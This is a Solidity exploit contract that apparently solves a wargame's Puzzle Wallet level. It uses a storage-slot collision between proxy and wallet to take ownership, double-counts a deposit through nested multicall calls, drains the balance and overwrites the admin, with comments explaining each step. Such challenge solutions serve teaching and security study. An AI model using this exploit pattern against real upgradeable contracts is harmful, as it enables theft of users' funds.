// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IPuzzle {
    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external;

    function execute(address to, uint256 value, bytes calldata data) external payable;

    function multicall(bytes[] calldata data) external payable;

    function setMaxBalance(uint256 _maxBalance) external;

    function balances(address) external returns (uint256);
}

contract Hack {
    IPuzzle puzzle;

    constructor(IPuzzle puzzleAddress) {
        puzzle = IPuzzle(puzzleAddress);
    }

    function attack() public payable {
        // You can send any address to propose a new admin
        // Its the previus step for convert to admin
        puzzle.proposeNewAdmin(address(this));

        // Automatically Im owner, because share the same slot
        // we ovewriten the slot 0
        // address public owner; slot 0 PuzzleWallet
        // address public pendingAdmin; slot 0 PuzzleProxy
        // If a update a state variable in PuzzleProxy is update in Puzzle Wallet
        // so, I can push my address in whitelist
        puzzle.addToWhitelist(address(this));
        // Now, we can permission for use any function inside PuzzleWallet

        // Create a data to send to multicall
        // We need to set in our balance the total amount of this contract
        // why ?  if withdraw all amount we can set the max balance
        // and overwriten the owner
        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeWithSelector(puzzle.deposit.selector);

        // We can pass this require  if (selector == this.deposit.selector)
        bytes[] memory data = new bytes[](2);
        data[0] = deposit[0];
        // Call again multicall, increment up our balance again with deposit using data[1]
        data[1] = abi.encodeWithSelector(puzzle.multicall.selector, deposit);

        puzzle.multicall{value: msg.value}(data);
        // Get the balance for withdraw
        uint256 balance = puzzle.balances(address(this));
        // withdraw all amount to my account
        puzzle.execute(msg.sender, balance, "");

        //  overwriten the admin
        puzzle.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
